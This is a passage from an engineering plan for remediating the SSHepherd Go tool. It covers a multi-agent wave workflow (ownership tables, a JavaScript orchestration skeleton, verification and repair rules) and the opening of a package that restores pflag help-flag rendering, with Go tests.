4. **Verifier.** Independent agents, several lenses per package, each in its own worktree at the committed SHA. They get the integrator's gate output instead of re-running `make check`. For fix packages: lens 0 "failure scenario still reproduces?", lens 1 "safety contract and on-hold boundary", lens 2 "tests and docs in sync" (mutations only inside its worktree, then discarded). For spec packages: "grounded in the code", "on-hold boundaries", "decision-ready". Exactly **one** verifier per wave runs `make integration`, under the integration lock. Each problem names a `findingId` (one of the package's IDs, or `OTHER`), a `location` (file:line) and the command or evidence.
5. **Confirmation and repair.** A problem is confirmed when: two lenses report the same `findingId` + `location`; or lens 0 reports a command that **still fails on a clean re-run** in a fresh worktree; or lens 1 cites a file:line that breaks a safety contract or an on-hold boundary; or lens 2 cites a failing README/`--help`/golden comparison. Unconfirmed single-lens problems are not dropped: they go to the integrator as a report and into the wave summary. For each package with confirmed problems, a repair agent fixes them in a worktree (TDD again, same ownership filter); the integrator applies, re-runs the gates and commits `fix(<area>): <what> (repair, <IDs>)`.
6. **CI preflight (W0 and W2, if D0 = yes), then push.** The integrator pushes the wave's commits to `preflight/<wave>` and runs `gh workflow run ci.yml --ref preflight/<wave>` (ci.yml already has `workflow_dispatch`), then `gh run watch`. The wave counts as green only when that run is green; then `master` is pushed (main session or owner) and the preflight branch is deleted. No PR. Force-push is blocked, so mistakes are fixed forward with a new commit or `git revert`, never by amending pushed history.
7. **Post-push checks (main session).** W0: `gh workflow run release.yml --ref master` (GitHub only dispatches a workflow file on the default branch) must be green with `publish` skipped; fix forward if not.

### Spec packages

`brainstorm → spec → owner decisions (one at a time) → spec approved → writing-plans plan → implementation workflow (same shape as a fix wave)`.

The spec agent writes only its `docs/superpowers/specs/2026-11-08-*.md` file, using the design sketch in its package section. The main session then asks the decisions in the order above. After approval, a new plan in this repo's writing-plans format (`docs/superpowers/plans/2026-11-07-apply-json.md`) is written for the implementation and committed before its wave; it gets its own wave (W4 for P04, written after W3; W5+ for P08, P09 and P10). In a mixed wave, spec lanes have `kind: 'spec'`: they get the spec lenses and no `make check`/`make integration` of their own.

### File ownership rules

- Inside a round, every file has **one** owner lane. The ownership tables in each wave's intro are the contract, and the lane filter plus the integrator's numstat check enforce it.
- `README.md` and `CLAUDE.md` belong to the integrator in every wave. Agents hand over deltas.
- A package that must change a file it does not own stops and reports it in `foreignBreaks`. The integrator makes that change as a merge fix.
- Two packages that need the same file go in **different waves**, or in different **rounds** of one wave (a later round's worktrees start from the earlier round's commits).
- **Integration lock** (until P13 Task 10 gives every run a unique container name and port): `make integration`, and every scratch-copy run of `scripts/integration.sh` (P03's mutation proofs included), first takes `mkdir "$PATCH_DIR/it.lock" && echo "<label> $(date +%s)" > "$PATCH_DIR/it.lock/owner"` and releases it with `rm -r "$PATCH_DIR/it.lock"`. Agents wait with a Monitor or a background until-loop (foreground `sleep` is blocked) and break a lock whose owner timestamp is older than 30 minutes.
- Go runs under the Makefile's pinned toolchain (`GOTOOLCHAIN=go1.27.3`). The rtk hook summarizes test output; use `rtk proxy go test …` when exact failure lines matter.
- Goldens are only rewritten with `-update`, and every regenerated golden is read back by eye before it is accepted.

### Hot files (handed from wave to wave)

Built from every wave's ownership table plus the P04-impl, P08-impl and P14 file lists. The scout checks that each previous owner's commit is on master before the next owner starts.

| File | Order |
|---|---|
| `internal/apply/plan.go` | P05 (W1) → P11 (W2) → P14 (W3) → P04-impl (W4) → P08-impl |
| `internal/apply/json.go`, `report.go` | P07 (W1) → P14 (W3) → P08-impl |
| `internal/apply/exec.go` | P11 (W2) → P14 (W3) → P08-impl |
| `internal/apply/edit.go` | P06 (W1) → P14 (W3, if moved names) → slice S2 |
| `cmd/sshepherd/run.go` | P01 (W0) → P06 (W1) → P13-A (W2) |
| `cmd/sshepherd/import.go` | P01 (W0) → P06 (W1) → P12-C (W2 r2) → P04-impl (W4) |
| `cmd/sshepherd/adopt.go`, `adopt_test.go` | P06 (W1 r1) → P07-F1 (W1 r2) → P12-C (W2 r2) → P04-impl (W4) |
| `cmd/sshepherd/edit.go` | P06 (W1) → P12-C (W2 r2) |
| `cmd/sshepherd/keyarg.go` | P05 (W1) → P12-B (W2, doc comment only) |
| `cmd/sshepherd/revoke.go` | P06 (W1) → P12-B (W2) → P14 (W3) → P04-impl (W4) |
| `cmd/sshepherd/apply.go`, `editrun.go` | P06 (W1) → P14 (W3) → P04-impl (W4) → P08-impl |
| `cmd/sshepherd/e2e_test.go` | P13-D (W2 r2) → P04-impl (W4) |
| `cmd/sshepherd/identity_integration_test.go` | P13-0 (W0) |
| `cmd/sshepherd/testdata/help/*.golden` | P01 (W0, creates) → P06 (W1) → P12-C (W2 r2, `adopt.golden`) |
| `internal/adopt/adopt.go`, `adopt_test.go` | P05 (W1 r1) → P07-F1 (W1 r2) → P14 (W3, renames) → P04-impl (W4) |
| `internal/audit/audit.go` | P07 (W1) → P11 (W2) → P14 (W3) → P04-impl (W4) |
| `internal/audit/{errors,report,json}.go` | P07 (W1) → P14 (W3) → P04-impl (W4) |
| `internal/config/config.go` | P05 (W1) → P04-impl (W4) |
| `internal/manifest/manifest.go` | P12-A (W2) → P04-impl (W4) |
| `internal/sshconn/errors.go` | P07 (W1) → P14 (W3) |
| `internal/sshconn/connect.go`, `connect_test.go` | P07 (W1) → P11-11B (W2) → P14 (W3) |
| `internal/sshconn/sshconn.go` | P11-11B (W2) → P14 (W3) |
| `internal/sshread/sshread.go` | P11-11B (W2) → P14 (W3) |
| `internal/sshread/integration_test.go` | P07 (W1, Task 4) → P11-11B (W2) → P14 (W3) |
| `internal/sshwrite/sshwrite.go` | P11-11A (W2) → P14 (W3) → P04-impl (W4) → P08-impl |
| `internal/sshwrite/sshwrite_test.go` | P03 (W0) → P07 (W1, one test) → P11-11A (W2) → P14 (W3) → P04-impl (W4) |
| `internal/sshwrite/integration_test.go` | P03 (W0) → P11-11A (W2) → P14 (W3) → P04-impl (W4) |
| `internal/sshwrite/fuzz_test.go` | P13-B (W2 r2) → P14 (W3) |
| `internal/sanitize` | P11-11B owns `sanitize.go` + new `truncate_test.go`; P13-B owns `sanitize_test.go` (W2 round 1, different files) |
| `.github/workflows/ci.yml`, `release.yml` | P02 (W0) → P13-C (W2 r1) → P13-D (W2 r2, integration matrix only) |
| `.github/dependabot.yml`, `scripts/docker-gates.sh` | P02 (W0) → P13-C (W2 r1) |
| `scripts/integration.sh` | P03 (W0) → P13-D (W2 r2) |
| `.golangci.yml` | P13-0 (W0) → P14 (W3) |
| `Makefile` | P13-0 (W0, `vet`/`gosec`) → P13-A (W2) → P14 (W3) |

### Ownership amendments found while planning

The package planners and the review panel found files their stubs missed. These are now part of each package's ownership:

| Package | Adds | Drops | Why |
|---|---|---|---|
| P06 | `cmd/sshepherd/edit.go` (the `runFlags` block), `cmd/sshepherd/rotate_keep_old_test.go`, `cmd/sshepherd/revoke_server_test.go`, `internal/apply/testdata/edit_header_access_keeps.golden` (new) | — | `runFlags` and the `--dry-run`/`--yes` group live in `edit.go`; two tests assert hint text; Task 7b's golden. |
| P07 | `internal/audit/errors.go`, `internal/sshconn/errors.go`, `internal/audit/drift_classes_test.go`; Task 4 only: `internal/sshconn/hostkey.go`, `internal/sshconn/sshconn_test.go`, `internal/sshread/integration_test.go`; Task 7 only: one test in `internal/sshwrite/sshwrite_test.go` | — | `Hinted`/`HintOf` live next to `ErrorKindOf`; a shared fixture changes; ARC-3's contract test. |
| P07-F1 | `internal/adopt/adopt.go`, `adopt_test.go`, `cmd/sshepherd/adopt.go`, `adopt_test.go` (W1 round 2) | — | F-P07-1. |
| P11 | `internal/apply/identity_test.go`, `internal/apply/offer_rank_test.go` (new), `cmd/sshepherd/probe_order_hermetic_test.go` (new), `internal/sshconn/connect.go` + `connect_test.go` (Task 7b) | — | `TestProbeOrder` calls the renamed function; WP-5 end-to-end proof; SEC-8 handshake text. |
| P12 | `internal/manifest/fuzz_test.go`, `cmd/sshepherd/testdata/help/adopt.golden` | `internal/adopt/*` (F-P07-1 moved to W1); `cmd/sshepherd/keyarg_test.go` (no change); `keyarg.go` only gets a doc comment | `Append` signature change; adopt's help footer. |
| P13 | `scripts/docker-gates.sh`; P13-0 in W0 owns `.golangci.yml`, the Makefile `vet`/`gosec` recipes, `identity_integration_test.go` | — | the hardened smoke run; OPS-7 moved early. |
| P14 | `internal/apply/report.go`, `internal/apply/predicates*.go` (new), rename-only test edits across sshconn/sshwrite/apply/adopt/audit/cmd | S1 (moved to P07) | P14 runs alone, so the wider set is safe. |

### Reusable workflow skeleton (one wave)

The main session runs this once per wave with `args` filled from that wave's ownership table. It is plain JavaScript for the Workflow tool. `rounds` holds lanes that must wait for an earlier round's commits (for example W2's P12-C and P13-B/D, and W1's P07-F1).

```js
export const meta = {
  name: 'sshepherd-remediation-wave',
  description: 'Run one remediation wave: parallel package agents in worktrees, one integrator, adversarial verify, repair',
  whenToUse: 'Executing one wave of docs/superpowers/plans/2026-11-07-review-remediation.md',
  phases: [
    { title: 'Scout', detail: 'plan committed, master clean, worktrees ignored, hot files handed over, baseSha' },
    { title: 'Packages', detail: 'one agent per lane in a git worktree at baseSha; ownership-filtered patch, no commits' },
    { title: 'Integrate', detail: 'numstat path check, git apply --index --3way, make check, make integration, docs, commit' },
    { title: 'Verify', detail: 'independent lenses per package in worktrees at the committed SHA' },
    { title: 'Repair', detail: 'fix confirmed problems, re-run gates, commit' },
  ],
}

// args: { wave: 'W1', repo: '/Users/javad/w/personal/SSHepherd',
//         plan: 'docs/superpowers/plans/2026-11-07-review-remediation.md',   // relative: resolved inside each worktree
//         patchDir: '<absolute scratchpad dir>',
//         rounds: [[{ pkg: 'P05', lane: 'A', kind: 'fix', ids: ['ARC-7', 'COR-1'], tasks: 'Tasks 1-5',
//                     files: ['internal/authkeys/options*.go', 'internal/config/config*.go'], needsIntegration: false }]],
//         mergeOrder: ['P05', 'P07', 'P06', 'P08', 'P09', 'P07-F1'],
//         handoffs: ['P07 breaks apply_test.go:130: change "ERROR:" to "ERROR [dial]:"'] }
const { wave, repo, plan, patchDir, rounds, mergeOrder, handoffs } = args
const LOCK = `${patchDir}/it.lock`
const lockRule = label =>
  `Before make integration (or any scripts/integration.sh run): take the lock with ` +
  `'mkdir ${LOCK} && echo "${label} $(date +%s)" > ${LOCK}/owner'; if it exists, wait with a Monitor or a background ` +
  `until-loop (foreground sleep is blocked) and remove it only if its owner timestamp is older than 30 minutes; ` +
  `release it with 'rm -r ${LOCK}' when done. `

const PATCH = {
  type: 'object',
  properties: {
    pkg: { type: 'string' }, lane: { type: 'string' },
    base: { type: 'string', description: 'git rev-parse HEAD the lane started from' },
    patch: { type: 'string', description: 'absolute path of the staged, ownership-filtered binary patch' },
    commands: { type: 'array', items: { type: 'string' }, description: 'each command run and its result (FAIL then PASS)' },
    docsDelta: { type: 'string', description: 'exact README/CLAUDE.md text for the integrator' },
    foreignBreaks: { type: 'array', items: { type: 'string' }, description: 'files owned by others that need a change, and every dropped foreign path' },
  },
  required: ['pkg', 'lane', 'base', 'patch', 'commands', 'docsDelta', 'foreignBreaks'],
}
const SCOUTED = {
  type: 'object',
  properties: { ready: { type: 'boolean' }, baseSha: { type: 'string' }, blockers: { type: 'array', items: { type: 'string' } } },
  required: ['ready', 'baseSha', 'blockers'],
}
const INTEGRATED = {
  type: 'object',
  properties: {
    commits: { type: 'array', items: { type: 'string' } },
    baseSha: { type: 'string', description: 'git rev-parse master after the last commit' },
    gates: { type: 'array', items: { type: 'string' }, description: 'make check / make integration results, verbatim tails' },
    rejected: { type: 'array', items: { type: 'string' }, description: 'lanes whose patch listed a foreign path' },
    blocked: { type: 'string', description: 'empty when everything landed' },
  },
  required: ['commits', 'baseSha', 'gates', 'rejected', 'blocked'],
}
const verdictSchema = ids => ({
  type: 'object',
  properties: {
    pkg: { type: 'string' }, lens: { type: 'integer' },
    problems: { type: 'array', items: { type: 'object',
      properties: {
        findingId: { type: 'string', enum: [...ids, 'OTHER'] },
        location: { type: 'string', description: 'file:line' },
        evidence: { type: 'string', description: 'the command run and its output, or the quoted line' },
        cleanRerunFails: { type: 'boolean', description: 'lens 0 only: the command still fails in a fresh worktree at the same SHA' },
      },
      required: ['findingId', 'location', 'evidence'] } },
  },
  required: ['pkg', 'lens', 'problems'],
})

phase('Scout')
const scout = await agent(
  `Read-only, in ${repo}. Confirm: ${plan} and every spec/plan this wave runs are committed (git ls-files --error-unmatch); ` +
  `git status --porcelain is empty; .claude/worktrees/ is git-ignored, and after 'git worktree add' of a throwaway worktree, ` +
  `'make fmt secrets' in ${repo} stays green (remove the worktree after); master holds the previous wave's commits; ` +
  `for every hot file this wave touches (see "Hot files" in ${plan}), its previous owner's commit is on master; make check is green; ` +
  `every lane of ${wave} has its depends_on committed and its owner decisions answered or a safe default named. ` +
  `Return ready, baseSha (git rev-parse master) and blockers.`, { label: `scout ${wave}`, schema: SCOUTED })
if (!scout || !scout.ready) return { wave, blocked: scout ? scout.blockers : ['scout died'] }

let baseSha = scout.baseSha
const integrated = []
const lanes = rounds.flat()
for (let r = 0; r < rounds.length; r++) {
  phase('Packages')
  const patches = await parallel(rounds[r].map(l => () => agent(
    `You are the ${l.pkg} lane ${l.lane} agent for ${wave}, round ${r}. First: test -f "${plan}" (inside your worktree; stop if missing), ` +
    `then: test "$(git rev-parse HEAD)" = ${baseSha} || git checkout -q --detach ${baseSha}; report the base you used. ` +
    `Follow "${l.pkg}" (${l.tasks}) in ${plan} exactly, TDD: write the failing test, run it and see FAIL, implement, run it and see PASS. ` +
    `You own ONLY these paths (shell globs): ${l.files.join(' ')}. Never commit. README.md/CLAUDE.md text goes in docsDelta only. ` +
    (l.kind === 'spec' ? 'This is a spec lane: write only the spec file; no make check. ' : 'Run make check before handing back. ') +
    (l.needsIntegration ? lockRule(`${wave}-${l.pkg}${l.lane}`) : '') +
    `When done: git add -A; unstage (git reset -q -- <path>) every staged path that matches none of your globs and list it in foreignBreaks; ` +
    `then git diff --cached --binary > ${patchDir}/${wave}-${l.pkg}-${l.lane}.patch, and report.`,
    { label: `${l.pkg}${l.lane}`, phase: 'Packages', isolation: 'worktree', schema: PATCH })))
  const got = patches.filter(Boolean)
  const missing = rounds[r].filter(l => !got.some(p => p.pkg === l.pkg && p.lane === l.lane))
  if (missing.length) log(`round ${r}: no patch from ${missing.map(l => l.pkg + l.lane).join(', ')} (integrator will report it blocked)`)

  phase('Integrate')
  const owned = Object.fromEntries(rounds[r].map(l => [`${l.pkg}-${l.lane}`, l.files]))
  const res = await agent(
    `You are the ${wave} integrator, round ${r}, in ${repo} on master. For each patch below, in package order ${mergeOrder.join(' > ')}: ` +
    `run 'git apply --numstat <patch>' and REJECT the lane (list it in rejected, apply nothing of it) if any path matches none of that lane's globs ` +
    `${JSON.stringify(owned)}; otherwise 'git apply --index --3way <patch>'. Patches: ${JSON.stringify(got)}. ` +
    `Apply these hand-offs: ${JSON.stringify(handoffs)}. After each package: make check, its README/CLAUDE.md delta ` +
    `(samples re-copied from regenerated goldens), CLAUDE.md Status, then one commit with the attribution trailer ` +
    `(one per lane where ${plan} says so). ` + lockRule(`${wave}-integrate-${r}`) +
    `Run make integration after the last package of the round. Fix foreignBreaks as merge fixes. ` +
    `'git ls-files | grep _stub.go' must print nothing. Do not push. Return baseSha = git rev-parse master.`,
    { label: `integrate ${wave}.${r}`, phase: 'Integrate', schema: INTEGRATED })
  integrated.push(res)
  if (!res || res.blocked || res.rejected.length) return { wave, integrated, blocked: res ? (res.blocked || `rejected: ${res.rejected}`) : 'integrator died' }
  baseSha = res.baseSha
}

phase('Verify')
const pkgs = [...new Set(lanes.map(l => l.pkg))]
const kindOf = pkg => (lanes.find(l => l.pkg === pkg) || {}).kind || 'fix'
const idsOf = pkg => [...new Set(lanes.filter(l => l.pkg === pkg).flatMap(l => l.ids || []))]
const LENSES_FIX = [
  'failure scenario: rebuild each finding\'s failure scenario from the plan and show it no longer reproduces (or still does); a reproducing command must also fail on a clean re-run in a fresh worktree at the same SHA',
  'safety and scope: write-path contracts, refusal guarantees, on-hold boundaries (prune, apply --force, import --prefer, keygen/rotation schedule, move-key, wipe mode), no schema or exit-code change without a decision',
  'tests and docs: each fix has a test that fails without it (mutate and re-run inside YOUR worktree only, then discard), README matches --help and goldens, CLAUDE.md Status matches README',
]
const LENSES_SPEC = [
  'grounded in the code: every cited file:line exists at this SHA and says what the spec claims',
  'on-hold boundaries: nothing re-proposes prune, apply --force, import --prefer, keygen/scheduled rotation, move-key or wipe mode',
  'decision-ready: each question is one plain sentence with options, a recommendation, a safe default and the README sections it changes',
]
const gateLog = JSON.stringify(integrated.map(i => i && i.gates))
let integrationVerifierUsed = false
const verdicts = await pipeline(pkgs,
  pkg => {
    const spec = kindOf(pkg) === 'spec'
    const lenses = spec ? LENSES_SPEC : LENSES_FIX
    const runIt = !spec && !integrationVerifierUsed
    if (runIt) integrationVerifierUsed = true
    return parallel(lenses.map((lens, i) => () => agent(
      `Verifier for ${pkg} in ${wave} (${plan}), in your own worktree: first git checkout -q --detach ${baseSha}. Lens ${i}: ${lens}. ` +
      `Try to REFUTE that each finding of ${pkg} (${idsOf(pkg).join(', ') || 'see the plan'}) is fixed. Do not run make check: ` +
      `the integrator's gate output is ${gateLog}. Every problem names findingId, location (file:line) and evidence. ` +
      (runIt && i === 0 ? `You are this wave's only integration verifier: ` + lockRule(`${wave}-verify-${pkg}`) + `then run make integration. ` : ''),
      { label: `verify ${pkg} #${i}`, phase: 'Verify', isolation: 'worktree', schema: verdictSchema(idsOf(pkg)) })))
  },
  vs => {
    const all = vs.flatMap((v, i) => (v ? v.problems.map(p => ({ ...p, lens: i })) : []))
    const key = p => `${p.findingId}@${p.location}`
    const groups = {}
    for (const p of all) (groups[key(p)] = groups[key(p)] || []).push(p)
    const confirmed = [], reportOnly = []
    for (const ps of Object.values(groups)) {
      const lensesHit = new Set(ps.map(p => p.lens))
      const ok = lensesHit.size >= 2 ||
        ps.some(p => p.lens === 0 && p.cleanRerunFails) ||
        ps.some(p => p.lens === 1 && /:\d+/.test(p.location)) ||
        ps.some(p => p.lens === 2 && /golden|--help|README/.test(p.evidence))
      ;(ok ? confirmed : reportOnly).push(...ps)
    }
    return { confirmed, reportOnly }
  })

phase('Repair')
const toFix = pkgs.map((pkg, i) => ({ pkg, problems: (verdicts[i] || {}).confirmed || [] })).filter(x => x.problems.length)
const unconfirmed = pkgs.map((pkg, i) => ({ pkg, problems: (verdicts[i] || {}).reportOnly || [] })).filter(x => x.problems.length)
if (!toFix.length) return { wave, integrated, repaired: [], unconfirmed }
const repairs = await parallel(toFix.map(x => () => agent(
  `Repair agent for ${x.pkg} in ${wave}. First: git checkout -q --detach ${baseSha}. Problems confirmed by verification: ` +
  `${JSON.stringify(x.problems)}. Fix them TDD-style inside ${x.pkg}'s files only (globs: ` +
  `${lanes.filter(l => l.pkg === x.pkg).flatMap(l => l.files).join(' ')}; see ${plan}). Never commit. ` +
  `git add -A, unstage every foreign path, git diff --cached --binary > ${patchDir}/${wave}-${x.pkg}-repair.patch, and report.`,
  { label: `repair ${x.pkg}`, phase: 'Repair', isolation: 'worktree', schema: PATCH })))
const final = await agent(
  `${wave} integrator, repair round, in ${repo}. For each patch, numstat-check its paths against that package's globs, then ` +
  `git apply --index --3way: ${JSON.stringify(repairs.filter(Boolean))}. make check, ` + lockRule(`${wave}-repair`) +
  `make integration, docs, one commit per package: "fix(<area>): <what> (repair, <IDs>)". Do not push.`,
  { label: `integrate ${wave} repair`, phase: 'Repair', schema: INTEGRATED })
return { wave, integrated, repaired: toFix.map(x => x.pkg), unconfirmed, final }
```

After the workflow returns, the main session runs step 6 (preflight, push) and step 7 (post-push checks), and reports `unconfirmed` to the owner in the wave summary.

---

## Wave 0 — safety net, release gates, `--help`, early lint, and the PRD-1 spec

**Starts:** after Pre-W0. **Decisions needed:** D0 and D6 before W0's push (D6 is a precondition for the first release, not for W0's code). D27 is asked while W0 runs (W1 needs it). D28 and Block 1 are asked while W1–W3 run, using P04's spec.
**Packages:** P01, P02, P03, P13-0 (fix) and P04 (spec). 19 findings, including both HIGH ones (TST-1 fixed, PRD-1 specced), and OPS-7 early so every later agent's `make check` type-checks the integration and E2E files.

| Lane | Package / tasks | Files (exclusive in W0) | `make integration` |
|---|---|---|---|
| P01 | Tasks 1–5 (one agent) | `cmd/sshepherd/usage.go` (new), `usage_test.go` (new), `run.go` (one line), `import.go` (`--merge` usage only), `help_readme_test.go`, `help_golden_test.go` (new), `testdata/help/*.golden` (new) | no |
| P02-A | Tasks A1–A2 | `Dockerfile`, `scripts/docker-gates.sh` | no |
| P02-B | Tasks B1–B3 | `.github/workflows/release.yml`, `.github/workflows/ci.yml`, `.github/dependabot.yml` | no |
| P03-A | Tasks 1–3 | `internal/sshwrite/sshwrite_test.go`, `internal/sshconn/sshtest/sshtest.go`, `internal/sshconn/sshtest/sshtest_test.go` (new) | no |
| P03-B | Tasks 4–6 | `internal/sshwrite/integration_test.go`, `scripts/integration.sh` | yes (takes the lock) |
| P13-0 | P13 Task 1 (OPS-7) | `.golangci.yml`, `Makefile` (`vet` and `gosec` recipes only), `cmd/sshepherd/identity_integration_test.go` | no |
| P04 | spec only (`kind: 'spec'`) | `docs/superpowers/specs/2026-11-08-revocation-memory-design.md` (new) | no |

**Merge order and commits:** P13-0 → P03 (A → B) → P01 → P02-A → P02-B → P04, one commit per lane for P02 (A: Dockerfile + docker-gates.sh; B: workflows), so a broken release.yml can be reverted without undoing the cross-compile. `make integration` after P03 and again at the end.

**Integrator hand-offs (W0):**
- **P01 → README:** replace README.md:320-323 with the `### Global flags` table from P01 Task 3 Step 4. Without it the new root subtest fails. Check the import table row `--merge FILE` (unchanged, now true).
- **P02 → README/CLAUDE.md:** the Kubernetes CronJob (pinned `@sha256:`, hardened `securityContext`), the release notes, the exact `cosign verify` command (identity regexp, `--certificate-github-workflow-trigger push`, `--certificate-github-workflow-repository`, minimum cosign version), the provenance check, the scan policy and the Release recovery runbook; and the CLAUDE.md Container image wording (cross-compile on `$BUILDPLATFORM`, release gates, Go 1.27.3; fix the stale "Target Go 1.22+" at CLAUDE.md:82; the Go bump procedure incl. `GO_PIN`). Record the W0 release-gating commit SHA in CLAUDE.md Status ("every release tag must be at or after `<sha>`"). UX-12 is mostly done already in d059d45.
- **P02 → owner:** required checks, if ever added, name only `ci-ok`.
- **P03:** `TestOwnerChecksBite` matches the exact text of the owner checks. P11 (W2) must update its `ownerMutants` table, never delete the test.
- **P13-0:** CLAUDE.md quality-gates text: `go vet` and `gosec` also run with `-tags=integration`, and golangci-lint has `build-tags: [integration]`.
- **P04:** after the spec lands, the main session asks Block 1 (D28 → D1e), one at a time, while W1–W3 run.

**Wave exit:** `make check`, `make integration`, `go run github.com/rhysd/actionlint/cmd/actionlint@v1.7.12 -shellcheck= .github/workflows/*.yml`, `make docker docker-lint docker-scan smoke`; verifier and repair; then the CI preflight branch run (step 6), the push, and the post-push `release.yml` dispatch dry run (step 7).

### P01 — Restore clean --help flag rendering and make the README/--help sync test compare what users see

> **Program notes (master plan):** The `### Global flags` README table is applied by the W0 integrator. P06 (W1) regenerates `testdata/help/*.golden`; any later flag rename (D26 / slice S2) regenerates them and the README tables in the same commit.

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this package task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

- **Kind:** fix
- **Wave:** 0
- **Depends on:** none
- **Owner decision needed:** none. This puts back the `--help` output users had before Dependabot #1 (commit 6bca0b0). It does not change product behavior or the manifest schema.

**Goal:** Bool flags show as `--yes` in `--help` again, not `--yes[=true|false]`. The README flag tables are checked against `--help` for every command (`import` and the global flags included), defaults included. The full `--help` of the root and all six commands is pinned by golden files, so a later dependency bump that changes help text fails CI.

**Architecture:** A new `cmd/sshepherd/usage.go` adds a template function, `flagUsages`. It renders a FlagSet through pflag's own `FlagUsages`, but on a render-only copy where each bool flag's `Value` is wrapped so it no longer reports `IsBoolFlag()`. That one condition is all pflag v1.1.0 changed (the diff below), so the output is pflag v1.0.9's layout while pflag stays upgradeable. The root command's usage template is cobra's own default with the two `FlagUsages` calls sent through `flagUsages`. Subcommands inherit the template from their parent, so `Flags:` and `Global Flags:` are fixed on every command, including `help` and `completion`.

**Tech Stack:** Go 1.27, Cobra v1.10.2, pflag v1.1.0, golden files (`-update`), goleak (the existing `TestMain` in `cmd/sshepherd/leak_test.go`).

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| UX-13 | MEDIUM | pflag v1.1.0 (go.mod:7) renders every bool flag as `--flag[=true|false]` in `--help`, and CI stayed green. |
| UX-2 | MEDIUM | The same regression, seen across `--yes/--dry-run/--json/-h/--version`. `import`'s `--merge string` also differs from README.md:473 `--merge FILE`. |
| TST-4 | LOW | `help_readme_test.go:60` skips `import` and the global flags, compares only the first column (never defaults), and passes despite the `--merge` drift. |

#### Root cause (verified in code)

`diff` of `FlagSet.FlagUsagesWrapped` between `pflag@v1.0.9/flag.go` and `pflag@v1.1.0/flag.go` shows one functional change:

```go
// v1.1.0, flag.go:794
if isNoOptBoolValue(flag.Value) && flag.Value.Type() == "bool" {
    line += "[=true|false]"
} else if varname != "" {
```

`isNoOptBoolValue` (bool.go:15) is true only when the `Value` has `IsBoolFlag() bool` returning true. No pflag option turns it off. Cobra v1.10.2 renders `Flags:`/`Global Flags:` through `c.LocalFlags().FlagUsages()` / `c.InheritedFlags().FlagUsages()` (command.go:2021, 2025), or through `defaultUsageTemplate` (command.go:1962, 1965) once a template is set. A wrapper `Value` that keeps `Type() == "bool"` but drops `IsBoolFlag` gives the v1.0.9 output, and here is why:

- `UnquoteUsage` still maps the type `"bool"` to an empty varname (flag.go `switch name { case "bool", "boolfunc": name = "" }`).
- `defaultIsZeroValue` falls to its `default:` branch, where `DefValue == "false"` counts as zero, so `false` defaults still print no `(default …)`.
- `NoOptDefVal` is copied as `"true"`, and the `case "bool", "boolfunc"` branch prints nothing for `"true"`.

Cobra's `tmpl()` (cobra.go:179) parses the template lazily with the global `templateFuncs`. A function registered in `init()` is therefore available on every render, and `template.Must` cannot panic on a missing function.

#### Files owned

- `cmd/sshepherd/usage.go` (new): `flagUsages`, `plainBool`, `usageTemplate`, and the `init` registration.
- `cmd/sshepherd/usage_test.go` (new): renderer unit tests, the template-routing guard, the no-suffix check over every command, plus the shared `helpCommands`/`helpOutput` helpers.
- `cmd/sshepherd/run.go`: one line in `newRootCmd` (after run.go:214).
- `cmd/sshepherd/import.go`: the `--merge` usage string (import.go:433-434) only.
- `cmd/sshepherd/help_readme_test.go`: rewrite of `readmeFlagCells` and `TestHelpMatchesREADMETables` (lines 14-85). `TestHelpShowsIdentityVarnames` (lines 87-100) is kept as is.
- `cmd/sshepherd/help_golden_test.go` (new).
- `cmd/sshepherd/testdata/help/{root,audit,import,adopt,apply,revoke,rotate}.golden` (new).
- **Integrator-owned, handed over as a delta:** `README.md` (the new `### Global flags` table, Task 3), and `CLAUDE.md` (one Status sentence, see "Integrator handoff").

Rules: the agent works in its own git worktree and makes no commits. To get its tests green locally it applies the README delta in that worktree, and stages it as a separate hunk marked "integrator-owned". Run Go tests with plain `go test`. Use `rtk proxy go test …` when exact failure lines matter (the rtk hook summarizes output).

---

#### Task 1: The usage renderer (`flagUsages`)

**Files:**
- Create: `cmd/sshepherd/usage.go`
- Test: `cmd/sshepherd/usage_test.go` (new)

- [ ] **Step 1: Write the failing tests.** Create `cmd/sshepherd/usage_test.go`:

```go
package main

import (
	"strings"
	"testing"

	"github.com/spf13/pflag"
)

// TestFlagUsagesMatchesPflag109Layout pins pflag v1.0.9's layout: bool
// flags carry no [=true|false] suffix, varnames and non-zero defaults are
// kept, hidden flags are skipped, and the usage column is aligned.
func TestFlagUsagesMatchesPflag109Layout(t *testing.T) {
	fs := pflag.NewFlagSet("t", pflag.ContinueOnError)
	fs.BoolP("yes", "y", false, "skip the prompt")
	fs.Bool("dry-run", false, "plan only")
	fs.String("config", "sshepherd.yaml", "path to the manifest")
	fs.Int("parallel", 32, "max connections")
	fs.StringArray("identity", nil, "private key `PATH` to use")
	fs.Bool("secret", false, "never shown")
	if err := fs.MarkHidden("secret"); err != nil {
		t.Fatal(err)
	}
	want := "" +
		"      --config string   path to the manifest (default \"sshepherd.yaml\")\n" +
		"      --dry-run         plan only\n" +
		"      --identity PATH   private key PATH to use\n" +
		"      --parallel int    max connections (default 32)\n" +
		"  -y, --yes             skip the prompt\n"
	if got := flagUsages(fs); got != want {
		t.Errorf("flagUsages =\n%s\nwant\n%s", got, want)
	}
}

// TestFlagUsagesLeavesSourceFlagsUntouched: rendering wraps a copy only;
// the real bool flag still parses without a value.
func TestFlagUsagesLeavesSourceFlagsUntouched(t *testing.T) {
	fs := pflag.NewFlagSet("t", pflag.ContinueOnError)
	yes := fs.Bool("yes", false, "skip the prompt")
	_ = flagUsages(fs)
	if err := fs.Parse([]string{"--yes"}); err != nil {
		t.Fatalf("--yes without a value no longer parses: %v", err)
	}
	if !*yes {
		t.Fatal("--yes did not set the flag")
	}
	if f := fs.Lookup("yes"); f.NoOptDefVal != "true" {
		t.Errorf("NoOptDefVal = %q, want \"true\"", f.NoOptDefVal)
	}
}

// TestUsageTemplateRoutesBothFlagSections guards against a cobra upgrade
// changing its default template so the rewrite silently misses.
func TestUsageTemplateRoutesBothFlagSections(t *testing.T) {
	for _, want := range []string{"{{flagUsages .LocalFlags", "{{flagUsages .InheritedFlags"} {
		if !strings.Contains(usageTemplate, want) {
			t.Errorf("usageTemplate lacks %q:\n%s", want, usageTemplate)
		}
	}
	if strings.Contains(usageTemplate, ".FlagUsages") {
		t.Errorf("usageTemplate still calls pflag's FlagUsages directly:\n%s", usageTemplate)
	}
}
```

